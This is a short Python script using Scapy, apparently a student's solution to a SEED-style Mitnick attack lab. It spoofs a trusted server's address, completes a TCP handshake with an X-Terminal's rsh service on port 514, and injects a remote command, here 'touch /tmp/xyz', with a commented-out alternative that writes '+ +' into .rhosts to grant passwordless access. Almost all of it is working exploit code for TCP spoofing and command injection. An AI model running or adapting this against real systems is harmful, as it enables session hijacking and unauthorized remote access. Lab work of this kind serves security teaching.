from scapy.all import *
from random import randint
# 'U': URG bit
# 'A': ACK bit
# 'P': PSH bit
# 'R': RST bit
# 'S': SYN bit
# 'F': FIN bit
# 10.0.2.6 mac 08:00:27:21:81:31

seq_num = randint(1,65535)
ip=IP(src='10.0.2.6',dst='10.0.2.5')
tcp=TCP(sport=1023,dport=514,flags='S',seq=seq_num)
pkt=ip/tcp
send(pkt,verbose=0)


x_ip = "10.0.2.5" # X-Terminal
x_port = 514 # Port number used by X-Terminal
srv_ip = "10.0.2.6" # The trusted server
srv_port = 1023 # Port number used by the trusted server
# Add 1 to the sequence number used in the spoofed SYN
p=0

def spoof(pkt):
    global seq_num # We will update this global variable in the function
    global p
    old_ip = pkt[IP]
    old_tcp = pkt[TCP]
    # Print out debugging information
    tcp_len = old_ip.len - old_ip.ihl*4 - old_tcp.dataofs*4 # TCP data length
    print("{}:{} -> {}:{} Flags={} Len={}".format(old_ip.src, old_tcp.sport,
    old_ip.dst, old_tcp.dport, old_tcp.flags, tcp_len))
    # Construct the IP header of the response
    ip = IP(src=srv_ip, dst=x_ip)
    # Check whether it is a SYN+ACK packet or not;
    if old_tcp.flags=='SA' and old_tcp.dport==1023:
        seq_num=seq_num+1
        tcp=TCP(sport=srv_port,dport=x_port,flags='A',seq=seq_num,ack=old_tcp.seq+1)
        pkt=ip/tcp
        send(pkt,verbose=0)
        
        #data = '9090\x00seed\x00seed\x00echo + + > .rhosts\x00'
        data = '9090\x00seed\x00seed\x00touch /tmp/xyz\x00'
        tcp=TCP(sport=1023,dport=514,flags='PA',seq=seq_num,ack=old_tcp.seq+1)
        send(ip/tcp/data, verbose=0)
        print ('SA send')
    if old_tcp.flags=='S' and old_tcp.dport==9090:
        tcp=TCP(sport=9090,dport=srv_port,flags='SA',seq=randint(1,65535),ack=old_tcp.seq+1)
        pkt=ip/tcp
        send(pkt,verbose=0)
    # if it is, spoof an ACK packet
    # ... Add code here ...
myFilter = 'tcp' # You need to make the filter more specific
sniff(filter=myFilter, prn=spoof)



